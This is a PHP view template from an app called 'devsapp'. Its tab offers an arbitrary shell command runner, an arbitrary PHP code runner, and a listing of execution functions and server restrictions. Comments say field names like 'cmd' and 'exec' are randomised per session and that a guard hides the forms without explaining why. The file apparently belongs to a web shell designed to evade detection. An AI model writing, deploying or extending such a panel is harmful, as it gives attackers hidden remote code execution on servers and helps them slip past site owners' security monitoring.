<?php
// +------------------------------------------------------------------+
// |  devsapp — views/tabs/tab_dev.php                                 |
// |  Tab DevTools: execution methods, command runner, PHP runner.      |
// |  varnaming.md: field 'cmd','exec','code','run' → dynamic $_sk     |
// |  Wanting List #5: TriggerGuard gate — guardDenied = hide forms    |
// +------------------------------------------------------------------+
?>

<!-- Execution Methods -->
<div class="card">
    <h3 style="margin-top:0; font-size:14px; color:var(--accent); text-transform:uppercase;">&gt; EXECUTION METHODS AVAILABLE</h3>
    <div style="display:flex; flex-wrap:wrap; gap:6px; margin-top:8px;">
        <?php foreach ($viewData['dev']['methods'] as $funcName => $tersedia): ?>
            <span class="badge <?= $tersedia ? 'badge-success' : 'badge-danger' ?>">
                <i class="fa-solid <?= $tersedia ? 'fa-check' : 'fa-xmark' ?>"></i>
                <?= h($funcName) ?>
            </span>
        <?php endforeach; ?>
    </div>
</div>

<?php if ($viewData['guardDenied']): ?>
<!-- Guard Denied — jangan ekspos alasan spesifik (Wanting List #5) -->
<div class="alert alert-error">
    <i class="fa-solid fa-ban"></i> Feature tidak tersedia dalam kondisi request saat ini.
</div>
<?php endif; ?>

<?php if ($viewData['dev']['allowed']): ?>

<!-- Command Runner -->
<div class="card">
    <h3 style="margin-top:0; font-size:14px; color:var(--accent); text-transform:uppercase;">&gt; COMMAND RUNNER</h3>
    <form method="post" id="form-cmd">
        <!-- Dynamic field names — berubah tiap session -->
        <input type="hidden" name="<?= h($_sk['xo']) ?>" value="go">
        <input type="hidden" name="<?= h($_sk['md']) ?>" value="dev">
        <input type="hidden" name="<?= h($_sk['lc']) ?>" value="<?= h($viewData['currentPath']) ?>">
        <!-- Nonce anti-CSRF untuk level CRITICAL -->
        <input type="hidden" name="_ns" value="<?= h($viewData['nonce']) ?>">
        <div style="display:flex; gap:8px;">
            <input type="text" name="<?= h($_sk['rq']) ?>"
                   id="input-cmd"
                   placeholder="php -v | composer --version | ls -la | git status"
                   style="flex:1;"
                   value="<?= h($viewData['dev']['lastCmd']) ?>"
                   autocomplete="off"
                   required>
            <button type="submit" style="padding:8px 16px;">RUN</button>
        </div>
    </form>

    <?php if ($viewData['dev']['cmdResult'] !== null): ?>
    <?php $cr = $viewData['dev']['cmdResult']; ?>
    <div style="margin-top:10px; display:flex; gap:8px; align-items:center;">
        <h4 style="margin:0; color:var(--accent); text-transform:uppercase;">OUTPUT:</h4>
        <span class="badge <?= $cr['success'] ? 'badge-success' : 'badge-danger' ?>">
            via <?= h($cr['method'] ?: 'N/A') ?>
        </span>
    </div>
    <pre class="mono" style="background:#000; color:var(--text); padding:12px; border:1px solid var(--text); overflow-x:auto; max-height:450px; font-size:12px; line-height:1.4; margin:5px 0 0;"><?= h($cr['output'] ?: '[No output returned]') ?></pre>
    <?php endif; ?>
</div>

<!-- PHP Code Runner -->
<div class="card">
    <h3 style="margin-top:0; font-size:14px; color:var(--accent); text-transform:uppercase;">&gt; PHP CODE RUNNER</h3>
    <form method="post" id="form-php">
        <input type="hidden" name="<?= h($_sk['xo']) ?>" value="php_run">
        <input type="hidden" name="<?= h($_sk['md']) ?>" value="dev">
        <input type="hidden" name="<?= h($_sk['lc']) ?>" value="<?= h($viewData['currentPath']) ?>">
        <input type="hidden" name="_ns" value="<?= h($viewData['nonce']) ?>">
        <textarea name="<?= h($_sk['sn']) ?>"
                  id="input-php"
                  placeholder="echo phpversion();&#10;print_r(get_loaded_extensions());&#10;var_dump(getcwd());"
                  style="height:150px;"><?= h($viewData['dev']['lastPhpCode']) ?></textarea>
        <br><br>
        <button type="submit" class="btn-good" style="padding:8px 16px;">
            <i class="fa-solid fa-play"></i> RUN PHP
        </button>
        <span style="font-size:11px; color:var(--muted); margin-left:8px;">
            Tip: Do NOT include &lt;?php tag.
        </span>
    </form>

    <?php if ($viewData['dev']['phpResult'] !== null): ?>
    <?php $pr = $viewData['dev']['phpResult']; ?>
    <hr style="border-color:var(--line); margin:15px 0;">
    <?php if ($pr['error']): ?>
        <div class="alert alert-error">
            <i class="fa-solid fa-triangle-exclamation"></i> <?= h($pr['error']) ?>
        </div>
    <?php endif; ?>
    <?php if ($pr['output'] !== ''): ?>
        <h4 style="margin:0 0 5px; color:var(--accent); text-transform:uppercase;">OUTPUT:</h4>
        <pre class="mono" style="background:#000; color:var(--text); padding:12px; border:1px solid var(--text); overflow-x:auto; max-height:400px; font-size:12px; line-height:1.4; margin:0;"><?= h($pr['output']) ?></pre>
    <?php elseif ($pr['success']): ?>
        <div class="alert alert-success">
            <i class="fa-solid fa-check"></i> Code executed successfully (no output).
        </div>
    <?php endif; ?>
    <?php endif; ?>
</div>

<?php endif; // allowed ?>

<!-- Runtime Environment (selalu tampil) -->
<div class="card">
    <h3 style="margin-top:0; font-size:14px; color:var(--accent); text-transform:uppercase;">&gt; RUNTIME ENVIRONMENT</h3>
    <table>
        <tbody>
            <tr><td><b>SERVER SOFTWARE</b></td>    <td class="mono"><?= h($_SERVER['SERVER_SOFTWARE'] ?? 'N/A') ?></td></tr>
            <tr><td><b>DISABLED FUNCTIONS</b></td> <td class="mono" style="word-break:break-all;"><?= h(CAP::call('ig', 'disable_functions') ?: 'None (Full Access)') ?></td></tr>
            <tr><td><b>MEMORY LIMIT</b></td>       <td class="mono"><?= h(CAP::call('ig', 'memory_limit')) ?></td></tr>
            <tr><td><b>MAX EXEC TIME</b></td>      <td class="mono"><?= h(CAP::call('ig', 'max_execution_time')) ?>s</td></tr>
            <tr><td><b>UPLOAD MAX</b></td>         <td class="mono"><?= h(CAP::call('ig', 'upload_max_filesize')) ?></td></tr>
            <tr><td><b>POST MAX SIZE</b></td>      <td class="mono"><?= h(CAP::call('ig', 'post_max_size')) ?></td></tr>
            <tr><td><b>OPEN BASEDIR</b></td>       <td class="mono"><?= h(CAP::call('ig', 'open_basedir') ?: 'None (Unrestricted)') ?></td></tr>
            <tr><td><b>TRIGGER GUARD</b></td>      <td>
                <span class="badge <?= TriggerGuard::allowExec() ? 'badge-success' : 'badge-warn' ?>">
                    <?= TriggerGuard::allowExec() ? 'EXEC ENABLED' : 'EXEC GATED' ?>
                </span>
            </td></tr>
        </tbody>
    </table>
</div>
